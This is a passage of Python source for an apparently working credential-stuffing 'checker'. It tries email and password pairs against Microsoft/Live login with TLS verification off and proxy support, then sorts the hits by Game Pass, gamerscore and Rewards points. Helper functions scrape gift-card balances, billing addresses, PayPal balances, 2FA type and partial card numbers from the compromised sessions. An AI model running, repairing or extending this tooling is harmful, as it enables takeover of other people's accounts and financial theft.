                self._diag['reason'] = 'no_ppft'
                return {"status": "BAD"}
            sftag = sftag_match.group(1)

            url_post_match = re.search(r'"urlPost":"(.+?)"', resp.text)
            if not url_post_match:
                self._diag['reason'] = 'no_urlpost'
                return {"status": "BAD"}
            url_post = url_post_match.group(1)
            self._diag['ppft_found'] = True
            self._diag['urlpost_found'] = True

            login_req = session.post(url_post, data={'login': email, 'loginfmt': email,
                                                     'passwd': password, 'PPFT': sftag},
                                     timeout=15, verify=False)
            self._diag['login_final_url'] = (login_req.url or '')[:200]

            if "password is incorrect" in login_req.text.lower():
                self._diag['reason'] = 'wrong_password'; return {"status": "BAD"}
            if "account doesn't exist" in login_req.text.lower():
                self._diag['reason'] = 'no_account'; return {"status": "BAD"}
            if "recover?mkt" in login_req.text or "identity/confirm" in login_req.text:
                self._diag['reason'] = 'needs_verification'
                return {"status": "2FA", "email": email, "password": password}
            if "/Abuse?mkt=" in login_req.text:
                self._diag['reason'] = 'banned'; return {"status": "BANNED"}

            ms_token = None
            if 'access_token' in login_req.url:
                ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
            self._diag['token_found'] = bool(ms_token)
            if not ms_token:
                self._diag['reason'] = 'no_token'
                return {"status": "BAD"}

            xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate',
                json={"Properties": {"AuthMethod": "RPS",
                                      "SiteName": "user.auth.xboxlive.com",
                                      "RpsTicket": ms_token},
                      "RelyingParty": "http://auth.xboxlive.com",
                      "TokenType": "JWT"}, timeout=15, verify=False)
            if xb_req.status_code != 200:
                self._diag['reason'] = f'xbl_auth_{xb_req.status_code}'
                return {"status": "BAD"}
            xb_data = xb_req.json()
            xb_token = xb_data.get('Token')
            uhs = xb_data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
            if not xb_token or not uhs:
                self._diag['reason'] = 'no_xbl_token'; return {"status": "BAD"}

            xsts_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]},
                      "RelyingParty": "http://xboxlive.com",
                      "TokenType": "JWT"}, timeout=15, verify=False)

            gamerscore_int = 0
            games_list = []
            formatted_games = ""
            gamertag = ""
            xuid = ""
            country = "Unknown"
            payment_method = "None"
            renewal_date = "N/A"

            if xsts_req.status_code == 200:
                xsts_token = xsts_req.json().get('Token')
                prof_req = session.get(
                    "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamerscore,Gamertag",
                    headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}",
                             "x-xbl-contract-version": "2"}, timeout=15, verify=False)
                if prof_req.status_code == 200:
                    for setting in prof_req.json().get('profileUsers', [{}])[0].get('settings', []):
                        if setting.get('id') == 'Gamerscore':
                            gamerscore_int = int(setting.get('value', 0))
                        elif setting.get('id') == 'Gamertag':
                            gamertag = setting.get('value', '')
                formatted_games, games_list = self.get_formatted_games(session, uhs, xsts_token)

            self._diag['gamerscore'] = gamerscore_int
            if gamerscore_int < 5:
                self._diag['reason'] = f'low_gamerscore_{gamerscore_int}'
                return {"status": "BAD"}

            gamepass_status = "none"
            gamepass_type = "none"
            xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]},
                      "RelyingParty": "rp://api.minecraftservices.com/",
                      "TokenType": "JWT"}, timeout=15, verify=False)
            if xsts_mc_req.status_code == 200:
                mc_token = xsts_mc_req.json().get('Token')
                mc_auth = session.post(
                    'https://api.minecraftservices.com/authentication/login_with_xbox',
                    json={'identityToken': f"XBL3.0 x={uhs};{mc_token}"}, timeout=15, verify=False)
                if mc_auth.status_code == 200:
                    access_token = mc_auth.json().get('access_token')
                    ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore',
                                          headers={'Authorization': f"Bearer {access_token}"},
                                          timeout=15, verify=False)
                    ent_t = ent_req.text.lower()
                    if 'product_game_pass_ultimate' in ent_t:
                        gamepass_status, gamepass_type = "ULTIMATE", "GamePass Ultimate"
                    elif 'product_game_pass_pc' in ent_t:
                        gamepass_status, gamepass_type = "PC", "GamePass PC"
                    elif 'product_game_pass_core' in ent_t:
                        gamepass_status, gamepass_type = "CORE", "GamePass Core"

            result_data = {'email': email, 'password': password,
                           'gamerscore': gamerscore_int, 'gamertag': gamertag,
                           'gamepass': gamepass_status, 'gamepass_type': gamepass_type,
                           'games_list': formatted_games, 'games_data': games_list,
                           'country': country, 'xuid': xuid,
                           'payment_method': payment_method, 'renewal_date': renewal_date}

            if gamepass_status != "none":
                return {"status": "PREMIUM", "data": result_data}
            elif gamerscore_int >= 5000:
                result_data['premium_type'] = "High Gamerscore"
                return {"status": "PREMIUM", "data": result_data}
            else:
                return {"status": "FREE", "data": result_data}
        except requests.exceptions.Timeout:
            self._diag['reason'] = 'timeout'
            return {"status": "TIMEOUT"}
        except requests.exceptions.ProxyError:
            raise
        except Exception as e:
            self._diag['reason'] = str(e)[:120]
            return {"status": "ERROR"}

# ===== Rewards (original) =====
class RewardsChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        self.session.mount('https://', HTTPAdapter(pool_connections=50, pool_maxsize=50))
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self._diag = {}

    def check_account(self, email, password):
        try:
            s = self.session
            login_url = ("https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1784850000"
                         "&rver=7.0.6730.0&wp=MBI_SSL&wreply=https%3A%2F%2Foutlook.live.com%2Fowa%2F"
                         "&id=292841&cbcxt=out&lw=1&fl=dob%7Cfname%7Clname&cobrandid=90015&uaid="
                         + str(uuid.uuid4()).replace("-", "")[:16])
            r1 = s.get(login_url, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9"}, timeout=REQUEST_TIMEOUT, verify=False)
            body1 = r1.text
            self._diag['page_len'] = len(body1 or '')

            m = re.search(r'"urlPost"\s*:\s*"([^"]+)"', body1)
            if not m:
                self._diag['reason'] = 'no_urlpost'
                return "ERROR", "No urlPost"
            url_post = m.group(1).replace("\\/", "/")

            m = re.search(r'sFTTag":"<input[^>]+value=\\?"([^"\\]+)', body1)
            if not m:
                m = re.search(r'name="PPFT"\s+id="i0327"\s+value="([^"]+)"', body1)
            if not m:
                self._diag['reason'] = 'no_ppft'
                return "ERROR", "No PPFT"
            ppft = m.group(1)
            self._diag['ppft_found'] = True
            self._diag['urlpost_found'] = True

            login_data = (f"login={email}&loginfmt={email}&type=11&LoginOptions=1"
                          f"&passwd={password}&PPFT={ppft}&PPSX=PassportR&i19=9960")
            r2 = s.post(url_post, data=login_data, headers={
                "Host": "login.live.com", "Origin": "https://login.live.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Referer": r1.url,
                "Accept-Language": "en-US,en;q=0.9"},
                timeout=REQUEST_TIMEOUT, allow_redirects=True, verify=False)
            body2 = r2.text
            self._diag['login_final_url'] = (r2.url or '')[:200]

            cookie_names = list(s.cookies.keys())
            success = any(k in cookie_names for k in
                          ["JSH", "JSHP", "ANON", "WLSSC", "PPLState",
                           "__Host-MSAAUTHP", "MSAAUTHP"]) or "fntobu-y" in body2
            self._diag['success_cookie'] = success

            sErrTxt = ""
            m_err = re.search(r'"sErrTxt"\s*:\s*"([^"]*)"', body2)
            if m_err: sErrTxt = m_err.group(1)

            if not success:
                bl = body2.lower()
                if "too many times" in sErrTxt.lower() or "too many times" in bl:
                    self._diag['reason'] = 'rate_limited'; return "RATE_LIMIT", "Rate limited"
                if "incorrect" in sErrTxt.lower():
                    self._diag['reason'] = 'wrong_password'; return "BAD", "Wrong password"
                if "doesn" in sErrTxt.lower() and "exist" in sErrTxt.lower():
                    self._diag['reason'] = 'no_account'; return "BAD", "Account doesn't exist"
                if "verify" in sErrTxt.lower() or "confirm" in sErrTxt.lower():
                    self._diag['reason'] = 'needs_verify'; return "2FA", "Verification required"
                if "recover" in sErrTxt.lower():
                    self._diag['reason'] = 'needs_recover'; return "2FA", "Recovery required"
                if "locked" in sErrTxt.lower() or "blocked" in sErrTxt.lower():
                    self._diag['reason'] = 'locked'; return "2FA", "Account locked"
                self._diag['reason'] = 'login_failed'
                return "BAD", "Login failed"

            rewards_points = 0; rewards_level = ""; country_code = ""; display_name = ""
            is_rewards_member = False; lifetime_points = 0; redeemed_points = 0
            progress = ""; member_since = ""; program = ""; streak = 0
            try:
                r_rewards = s.get("https://rewards.bing.com/api/getuserinfo?type=1", headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "X-Requested-With": "XMLHttpRequest",
                    "Accept": "application/json, text/plain, */*",
                    "Referer": "https://rewards.bing.com/"}, timeout=REQUEST_TIMEOUT, verify=False)

                if r_rewards.status_code == 200:
                    try:
                        data = r_rewards.json()
                        dashboard = data.get("dashboard", {})
                        user_status = dashboard.get("userStatus", {})
                        level_info = user_status.get("levelInfo", {})
                        rewards_points   = int(user_status.get("availablePoints", 0) or 0)
                        lifetime_points  = user_status.get("lifetimePoints", 0) or 0
                        redeemed_points  = user_status.get("lifetimePointsRedeemed", 0) or 0
                        is_rewards_member = True
                        level_key = level_info.get("activeLevel", "") or ""
                        LEVEL_MAP = {"newLevel1": "Member", "newLevel2": "Silver", "newLevel3": "Gold"}
                        rewards_level = LEVEL_MAP.get(level_key, level_key)
                        pv = level_info.get("progress", 0) or 0
                        pm = level_info.get("progressMax", 0) or 0
                        progress = f"{pv}/{pm}" if pm else ""
                        country_code = (dashboard.get("country", "") or data.get("country", "")
                                        or user_status.get("country", ""))
                        display_name = (user_status.get("friendlyName", "")
                                        or dashboard.get("userProfile", {}).get("friendlyName", ""))
                    except Exception:
                        rewards_points = 0; is_rewards_member = False
            except Exception:
                pass

            country_full = translate_country(country_code) if country_code else "Unknown"
            result = {'email': email, 'password': password, 'points': rewards_points,
                      'level': rewards_level, 'country': country_full,
                      'country_code': country_code, 'name': display_name,
                      'lifetime': lifetime_points, 'redeemed': redeemed_points,
                      'member': is_rewards_member, 'progress': progress,
                      'member_since': member_since, 'program': program, 'streak': streak}
            if is_rewards_member and rewards_points > 0: return "HIT", result
            elif is_rewards_member and rewards_points == 0: return "ZERO", result
            return "CUSTOM", result
        except requests.exceptions.Timeout:
            self._diag['reason'] = 'timeout'
            return "ERROR", {"error": "Timeout"}
        except requests.exceptions.ProxyError:
            raise
        except Exception as e:
            self._diag['reason'] = str(e)[:120]
            return "ERROR", {"error": str(e)[:100]}


# =====================================================================
# ================== INTEGRATION v9: allmc.py FETCHERS ================
# =====================================================================
# All fetchers below are VERBATIM from allmc.py (only file I/O removed)
# -- used standalone, no globals/state.

CAPE_VALUES = {
    'minecon 2011': 'Legendary', 'minecon 2012': 'Legendary',
    'minecon 2013': 'Very Rare', 'minecon 2015': 'Very Rare',
    'minecon 2016': 'Rare',      'minecon earth': 'Common',
    'birthday': 'High',          '15th anniversary': 'High',
    'vanilla': 'Medium',         'migrator': 'Low',
    'cherry blossom': 'Medium',  'subscriber': 'Medium',
    'realms mapmaker': 'Rare',   'translator': 'Rare',
    'moderator': 'Rare',         'mojang office': 'Legendary',
    'optifine': 'Common',
}

_DECORATIVE_SYMBOLS_RE = re.compile('[✪✿✦⚚➎★☆◆◇■□●○◎☀☁☂☃☄☾☽♛♕♚♔♤♡♢♧♠♥♦♣⚜⚡✨❖⬥⬦⬧⬨⬩⭐🌟🟊]+')

def clean_name(name):
    if not name: return ''
    return _DECORATIVE_SYMBOLS_RE.sub('', str(name)).strip()

def clean_name_js(name):
    if not name: return ''
    cleaned = _DECORATIVE_SYMBOLS_RE.sub('', str(name)).strip()
    cleaned = re.sub('apis', '', cleaned, flags=re.IGNORECASE).strip()
    return cleaned

def _safe_t(default=7):
    return (min(default, 4), min(default, 8))

def fetch_meowapi_stats(username, uuid=None):
    def format_coins(num):
        if not isinstance(num, (int, float)): return '0'
        num = float(num); abs_num = abs(num)
        if abs_num >= 1e15: return f'{num/1e15:.1f}Q'
        if abs_num >= 1e12: return f'{num/1e12:.1f}T'
        if abs_num >= 1e9:  return f'{num/1e9:.1f}B'
        if abs_num >= 1e6:  return f'{num/1e6:.1f}M'
        if abs_num >= 1e3:  return f'{num/1e3:.0f}K'
        return str(int(num))
    def get_skill_average(member):
        skills = member.get('skills', {})
        total_level = 0; skill_count = 0
        skill_names = ['alchemy','carpentry','combat','enchanting','farming','fishing','foraging','mining','taming']
        for name in skill_names:
            sd = skills.get(name)
            if sd and 'levelWithProgress' in sd:
                total_level += sd['levelWithProgress']; skill_count += 1
        return total_level / skill_count if skill_count > 0 else 0
    try:
        timeout_val = 10
        player_url = f'https://api.soopy.dev/player/{username}'
        p_data = None; s_data = None
        if uuid:
            clean_uuid = uuid.replace('-', '')
            sb_url = f'https://soopy.dev/api/v2/player_skyblock/{clean_uuid}?networth=true'
            with ThreadPoolExecutor(max_workers=2) as ex:
                f1 = ex.submit(requests.get, player_url, timeout=timeout_val)
                f2 = ex.submit(requests.get, sb_url, timeout=timeout_val)
                try:
                    r1 = f1.result()
                    if r1.status_code == 200: p_data = r1.json()
                except: pass
                try:
                    r2 = f2.result()
                    if r2.status_code == 200: s_data = r2.json()
                except: pass
        else:
            p = requests.get(player_url, timeout=timeout_val).json()
            if p.get('success') and 'data' in p:
                p_data = p
                fetched_uuid = p['data'].get('uuid','').replace('-','')
                if fetched_uuid:
                    sb_url = f'https://soopy.dev/api/v2/player_skyblock/{fetched_uuid}?networth=true'
                    try: s_data = requests.get(sb_url, timeout=timeout_val).json()
                    except: pass
        if not p_data or not p_data.get('success') or 'data' not in p_data:
            return None
        data = p_data['data']
        final_uuid = uuid.replace('-','') if uuid else data.get('uuid','').replace('-','')
        ach = data.get('achievements', {})
        skywars_stars = ach.get('skywars_you_re_a_star', 0)
        arcade_coins = ach.get('arcade_arcade_banker', 0)
        bedwars_stars = ach.get('bedwars_level', 0)
        uhc_bounty = ach.get('uhc_bounty', 0)
        pit_gold = ach.get('pit_gold', 0)
        s = s_data if s_data else {}
        best_member = None; max_score = -1
        profiles_data = s.get('data', {}).get('profiles', {})
        for profile_id, profile in profiles_data.items():
            members = profile.get('members', {})
            member = members.get(final_uuid)
            if member:
                nw_detailed = member.get('nwDetailed', {})
                networth = nw_detailed.get('networth', 0) if nw_detailed else 0
                skill_avg = get_skill_average(member)
                sb_lvl = member.get('skyblock_level', 0)
                score = networth / 1e6 * 100 + skill_avg * 100 + sb_lvl * 10
                if score > max_score:
                    max_score = score; best_member = member
        coins = kills = fairy = networth = sb_lvl = 0
        avg_skill_level = 0.0; item_list_str = ''
        if best_member:
            coins = best_member.get('coin_purse', 0)
            kills = best_member.get('kills', {}).get('total', 0)
            fairy = best_member.get('fairy_souls_collected', 0)
            sb_lvl = best_member.get('skyblock_level', 0)
            nw_detailed = best_member.get('nwDetailed', {})
            networth = nw_detailed.get('networth', 0) if nw_detailed else 0
            types = nw_detailed.get('types', {}) if nw_detailed else {}
            if networth == 0 and coins > 0: networth = coins
            avg_skill_level = get_skill_average(best_member)
            def collect_items(cd):
                il = []
                if cd and cd.get('items'):
                    for i in cd['items']:
                        c = clean_name_js(i.get('name'))
                        if c: il.append(c)
                return il
            all_valid_items = []
            for cat in ['armor','equipment','wardrobe','weapons','inventory']:
                all_valid_items.extend(collect_items(types.get(cat)))
            MAX_SHOWN = 5
            if len(all_valid_items) > MAX_SHOWN:
                item_list_str = f"{', '.join(all_valid_items[:MAX_SHOWN])}, +{len(all_valid_items)-MAX_SHOWN} more"
            else:
                item_list_str = ', '.join(all_valid_items)
        parts = []
        if networth > 0: parts.append(f'NW: {format_coins(networth)}')
        if coins > 0: parts.append(f'Purse: {format_coins(coins)}')
        if avg_skill_level > 0: parts.append(f'Avg_Skill: {avg_skill_level:.2f}')
        if skywars_stars > 0: parts.append(f'SW: {skywars_stars}')
        if bedwars_stars > 0: parts.append(f'BW: {bedwars_stars}')
        if pit_gold > 0: parts.append(f'Pit_Gold: {format_coins(pit_gold)}')
        if uhc_bounty > 0: parts.append(f'UHC_Bounty: {format_coins(uhc_bounty)}')
        if sb_lvl > 0: parts.append(f'Sb_Lvl: {sb_lvl}')
        if arcade_coins > 0: parts.append(f'Arcade_Coins: {format_coins(arcade_coins)}')
        if kills > 0: parts.append(f'Sb_Kills: {kills}')
        if fairy > 0: parts.append(f'Sb_Fairy_Souls: {fairy}')
        if item_list_str: parts.append(f'Sb_Valuable_Items: {item_list_str}')
        return ' '.join(parts) if parts else None
    except Exception:
        return None

def fetch_cubecraft_stats(username):
    _cc_urls = [
        f'https://stats.cubecraft.net/api/player/{username}',
        f'https://api.cubecraft.net/v2/players/{username}',
        f'https://api.playcubecraft.net/v1/player/{username}',
    ]
    for url in _cc_urls:
        try:
            r = requests.get(url, headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                             timeout=_safe_t(8), verify=False)
            if r.status_code != 200: continue
            d = r.json()
            if not d: continue
            parts = []
            rank = d.get('rank') or d.get('player_rank') or ''
            if rank and str(rank).lower() not in ('member','','none','default'):
                parts.append(f'Rank:{rank}')
            lvl = d.get('level') or d.get('experience_level')
            if lvl: parts.append(f'Lvl:{lvl}')
            games = d.get('games') or d.get('stats') or {}
            _game_map = {'EggWars':'EW','SkyWars':'SW','Lucky Islands':'LI','Tower Defence':'TD','BlockWars':'BW',
                         'eggwars':'EW','skywars':'SW'}
            for gname, short in _game_map.items():
                gd = games.get(gname) or {}
                k = gd.get('kills',0) or gd.get('kills_count',0)
                w = gd.get('wins',0) or gd.get('wins_count',0)
                if int(k) > 0 or int(w) > 0:
                    parts.append(f'{short}:{k}K/{w}W')
            return ' | '.join(parts) if parts else 'Registered'
        except: continue
    return None

def fetch_lunar_stats(uuid):
    if not uuid or uuid == 'N/A': return None
    try:
        c = str(uuid).replace('-','')
        if len(c) < 32: return None
        fmt = f'{c[:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:]}'
    except: return None
    _lunar_urls = [
        f'https://api.lunarclientprod.com/player/profile/{fmt}',
        f'https://api.lunarclient.net/player/{fmt}',
        f'https://api.lunardev.me/profile/{fmt}',
    ]
    for url in _lunar_urls:
        try:
            r = requests.get(url, headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'},
                             timeout=_safe_t(7), verify=False)
            if r.status_code != 200: continue
            d = r.json()
            if not d: continue
            parts = []
            if d.get('premium') or d.get('isPremium'): parts.append('Premium')
            cosm = d.get('cosmetics') or d.get('equippedCosmetics') or []
            if cosm: parts.append(f'Cosmetics:{len(cosm)}')
            if d.get('active',{}).get('CLOAK') or d.get('cloak'): parts.append('Cloak')
            if d.get('active',{}).get('EMOTE') or d.get('emotes'): parts.append('Emote')
            if d.get('active',{}).get('COLOR') or d.get('plus_color'): parts.append('Color+')
            if d.get('partner') or d.get('isPartner'): parts.append('⭐Partner')
            if d.get('staff') or d.get('isStaff'): parts.append('Staff')
            return ' | '.join(parts) if parts else 'Registered'
        except: continue
    return None

def get_cape_value(cape_str):
    if not cape_str: return None
    cs = str(cape_str).lower()
    for name, val in CAPE_VALUES.items():
        if name in cs:
            return f'{name.title()} ({val})'
    return None

def fetch_namemc_skin(username, uuid):
    try:
        if not uuid or uuid == 'N/A': return None
        import base64 as _b64
        r = requests.get(f'https://sessionserver.mojang.com/session/minecraft/profile/{str(uuid).replace("-","")}',
                         headers={'User-Agent':'Mozilla/5.0'}, timeout=6, verify=False)
        if r.status_code == 200:
            for prop in r.json().get('properties', []):
                if prop.get('name') == 'textures':
                    decoded = _b64.b64decode(prop['value']).decode('utf-8', errors='ignore')
                    if '"SKIN"' in decoded:
                        slim = 'slim' in decoded.lower()
                        return f'Custom|{"Slim" if slim else "Classic"}'
                    return 'Default'
    except: pass
    return None

def fetch_uuid_backup(username):
    for url in [f'https://api.minetools.eu/uuid/{username}',
                f'https://playerdb.co/api/player/minecraft/{username}']:
        try:
            r = requests.get(url, headers={'User-Agent':'Mozilla/5.0'}, timeout=6, verify=False)
            if r.status_code == 200:
                d = r.json()
                uid = d.get('id') or d.get('data',{}).get('player',{}).get('id')
                if uid: return uid
        except: continue
    return None

def fetch_account_age(session):
    try:
        r = session.get('https://account.microsoft.com/profile',
                        headers={'User-Agent':'Mozilla/5.0'}, timeout=_safe_t(10))
        for pat in [r'"createdDateTime"\s*:\s*"([^"]+)"', r'"created"\s*:\s*"([^"]+)"']:
            m = re.search(pat, r.text, re.I)
            if m:
                raw = m.group(1)[:10]
                try:
                    dt = datetime.strptime(raw, '%Y-%m-%d')
                    age = (datetime.utcnow() - dt).days
                    if age < 365: return f'{age}d'
                    return f'{age//365}y {(age%365)//30}m'
                except: return raw
    except: pass
    return None

def detect_2fa_type(session):
    try:
        r = session.get('https://account.live.com/proofs/List',
                        headers={'User-Agent':'Mozilla/5.0'}, timeout=_safe_t(10))
        txt = r.text.lower(); types = []
        if 'authenticator' in txt or 'totp' in txt: types.append('Auth')
        if 'sms' in txt or ('phone' in txt and 'verify' in txt): types.append('SMS')
        if 'alternate email' in txt or 'recovery email' in txt: types.append('Email')
        if 'passkey' in txt: types.append('Passkey')
        return '+'.join(types) if types else None
    except: return None

def fetch_ms_country(session):
    try:
        for url in ['https://account.microsoft.com/billing/addresses',
                    'https://account.microsoft.com/profile']:
            r = session.get(url, headers={'User-Agent':'Mozilla/5.0'}, timeout=_safe_t(10))
            for pat in [r'"countryCode"\s*:\s*"([A-Z]{2})"',
                        r'"country"\s*:\s*"([A-Z]{2})"',
                        r'"billingCountry"\s*:\s*"([A-Z]{2})"']:
                m = re.search(pat, r.text)
                if m: return m.group(1).upper()
    except: pass
    return None

def fetch_sub_expiry(session):
    try:
        r = session.get('https://account.microsoft.com/services',
                        headers={'User-Agent':'Mozilla/5.0'}, timeout=_safe_t(10))
        for pat in [r'"expirationDate"\s*:\s*"([^"]{8,20})"',
                    r'"nextBillingDate"\s*:\s*"([^"]{8,20})"',
                    r'"endDate"\s*:\s*"([^"]{8,20})"']:
            m = re.search(pat, r.text)
            if m: return m.group(1)[:10]
    except: pass
    return None

def fetch_xbox_gamertag(session):
    try:
        r = session.get('https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag',
                        headers={'User-Agent':'Mozilla/5.0','x-xbl-contract-version':'3'}, timeout=10)
        if r.status_code == 200:
            m = re.search(r'"value"\s*:\s*"([^"]+)"', r.text)
            if m: return m.group(1)
        r2 = session.get('https://account.microsoft.com/profile',
                         headers={'User-Agent':'Mozilla/5.0'}, timeout=_safe_t(10))
        m2 = re.search(r'gamertag["\s:]+([^\s"<]{2,20})', r2.text, re.I)
        if m2: return m2.group(1)
    except: pass
    return None

def detect_alt_account(session):
    try:
        r = session.get('https://account.microsoft.com/family/home',
                        headers={'User-Agent':'Mozilla/5.0'}, timeout=_safe_t(10))
        if 'family' in r.url or 'familymember' in r.text.lower():
            if 'child' in r.text.lower(): return 'Child'
            if 'organizer' in r.text.lower(): return 'Organizer'
            return 'FamilyMember'
    except: pass
    return None

def fetch_gift_card_balance(session):
    try:
        r = session.get('https://account.microsoft.com/billing/redeem',
                        headers={'User-Agent':'Mozilla/5.0'}, timeout=_safe_t(10))
        for pat in [r'"balance"\s*:\s*"?(\d+\.?\d*)"?', r'\$(\d+\.\d{2})\s*credit']:
            m = re.search(pat, r.text, re.I)
            if m and float(m.group(1)) > 0:
                return f'{m.group(1)} credits'
    except: pass
    return None

def fetch_hypixel_guild(username):
    try:
        r = requests.get(f'https://api.hypixel.net/guild?player={username}',
                         headers={'User-Agent':'Mozilla/5.0'}, timeout=_safe_t(8), verify=False)
        if r.status_code == 200:
            d = r.json()
            g = d.get('guild')
            if g:
                gname = g.get('name','')
                members = g.get('members', [])
                for mem in members:
                    if str(mem.get('uuid','')).lower() in username.lower():
                        rank = mem.get('rank','Member')
                        return f'{gname} [{rank}] ({len(members)} üye)'
                return f'{gname} ({len(members)} üye)'
    except: pass
    return None

def parse_extra_hypixel_stats(stats_text):
    result = {}
    try:
        for pat in [r'SkyWars[^:]*Prestige[:\s]+([^\n|,]{2,20})', r'sw[_\s]prestige[:\s]+([^\n|,]{2,15})']:
            m = re.search(pat, stats_text, re.I)
            if m: result['sw_prestige'] = m.group(1).strip(); break
        for pat in [r'SkyWars[^:]*(?:Star|Level)[:\s]+(\d+)', r'sw[_\s](?:star|level)[:\s]+(\d+)']:
            m = re.search(pat, stats_text, re.I)
            if m: result['sw_stars'] = m.group(1); break
        for pat in [r'Murder[^\n]*[Kk]ill[:\s]+(\d+)', r'mm[_\s]kills?[:\s]+(\d+)']:
            m = re.search(pat, stats_text, re.I)
            if m: result['mm_kills'] = m.group(1); break
        for pat in [r'Murder[^\n]*[Ww]in[:\s]+(\d+)', r'mm[_\s]wins?[:\s]+(\d+)']:
            m = re.search(pat, stats_text, re.I)
            if m: result['mm_wins'] = m.group(1); break
        for pat in [r'Build[^\n]*[Ss]core[:\s]+(\d+)', r'bb[_\s]score[:\s]+(\d+)']:
            m = re.search(pat, stats_text, re.I)
            if m: result['bb_score'] = m.group(1); break
        for pat in [r'Build[^\n]*[Ww]in[:\s]+(\d+)', r'bb[_\s]wins?[:\s]+(\d+)']:
            m = re.search(pat, stats_text, re.I)
            if m: result['bb_wins'] = m.group(1); break
    except: pass
    return result

def fetch_bedrock_info(session):
    try:
        r = session.get('https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,UniqueModernGamertag,GameDisplayPicRaw',
                        headers={'User-Agent':'Mozilla/5.0','x-xbl-contract-version':'3'}, timeout=_safe_t(10))
        if r.status_code == 200:
            d = r.json()
            setts = {s.get('id'): s.get('value') for s in d.get('profileUsers', [{}])[0].get('settings', [])}
            tag = setts.get('Gamertag') or setts.get('UniqueModernGamertag')
            pfp = setts.get('GameDisplayPicRaw')
            if tag: return {'gamertag': tag, 'pfp': pfp}
    except: pass
    return None

def fetch_namemc_favorites(username):
    try:
        r = requests.get(f'https://namemc.com/profile/{username}',
                         headers={'User-Agent':'Mozilla/5.0','Accept-Language':'en-US,en;q=0.9'},
                         timeout=_safe_t(8), verify=False)
        m = re.search(r'(\d[\d,]+)\s*(?:people\s+)?favor', r.text, re.I)
        if m: return m.group(1).replace(',','')
        r2 = requests.get(f'https://namemc.com/search?q={username}',
                          headers={'User-Agent':'Mozilla/5.0'}, timeout=_safe_t(6), verify=False)
        m2 = re.search(r'(\d+)\s*favorit', r2.text, re.I)
        if m2: return m2.group(1)
    except: pass
    return None

def fetch_optifine_detail(username):
    try:
        r = requests.get(f'https://optifine.net/adloadx?f=OptiFine_{username}',
                         headers={'User-Agent':'Mozilla/5.0'}, timeout=_safe_t(6), verify=False)
        if r.status_code != 200: return None
        ver_m = re.search(r'OptiFine[_\s]([A-Za-z0-9_.]+)', r.text)
        date_m = re.search(r'(\d{4}-\d{2}-\d{2})', r.text)
        parts = []
        if ver_m: parts.append(f'v{ver_m.group(1)}')
        if date_m: parts.append(f'since:{date_m.group(1)}')
        return ' '.join(parts) if parts else 'Active'
    except: pass
    return None

def get_crafatar_url(uuid):
    if not uuid or uuid == 'N/A': return None
    clean = str(uuid).replace('-','')
    return f'https://crafatar.com/avatars/{clean}?size=128&overlay'

def fetch_paypal_balance(session):
    try:
        r = session.get('https://www.paypal.com/myaccount/summary',
                        headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'},
                        timeout=_safe_t(10), allow_redirects=True)
        for pat in [r'\$\s*(\d+\.\d{2})\s*USD', r'"totalBalance"\s*:\s*"?(\d+\.\d{2})"?',
                    r'balance["\s:]+\$?(\d+\.\d{2})']:
            m = re.search(pat, r.text, re.I)
            if m and float(m.group(1)) >= 0:
                return f'${m.group(1)} USD'
    except: pass
    return None

_CC_PATTERNS = [
    (r'\b4[0-9]{3}[\s\-]?[Xx*]{4}[\s\-]?[Xx*]{4}[\s\-]?([0-9]{4})\b', 'Visa'),
    (r'\b5[1-5][0-9]{2}[\s\-]?[Xx*]{4}[\s\-]?[Xx*]{4}[\s\-]?([0-9]{4})\b', 'Mastercard'),
    (r'\b3[47][0-9]{2}[\s\-]?[Xx*]{6}[\s\-]?([0-9]{5})\b', 'Amex'),
    (r'\b6(?:011|5[0-9]{2})[Xx*0-9\s\-]{8,}([0-9]{4})\b', 'Discover'),
    (r'"cardType"\s*:\s*"([^"]+)"', None),
    (r'"network"\s*:\s*"([^"]+)"', None),
]

def parse_cc_types(text):
    found = []
    for pat, cc_type in _CC_PATTERNS:
        for m in re.finditer(pat, text, re.I):
            val = cc_type if cc_type else m.group(1).title()
            last4 = m.group(1) if len(m.groups()) >= 1 else ''
            entry = f'{val}(*{last4})' if last4 and last4.isdigit() else val
            if entry not in found:
                found.append(entry)
    return found if found else None

def fetch_billing_address_detail(session):
    try:
        for url in ['https://account.microsoft.com/billing/addresses', 'https://account.microsoft.com/profile']:
            r = session.get(url, headers={'User-Agent':'Mozilla/5.0'}, timeout=_safe_t(10))
            city_m = re.search(r'"city"\s*:\s*"([^"]+)"', r.text, re.I)
            zip_m  = re.search(r'"postalCode"\s*:\s*"([^"]+)"', r.text, re.I)
            country_m = re.search(r'"countryCode"\s*:\s*"([A-Z]{2})"', r.text)
            parts = []
            if country_m: parts.append(country_m.group(1))
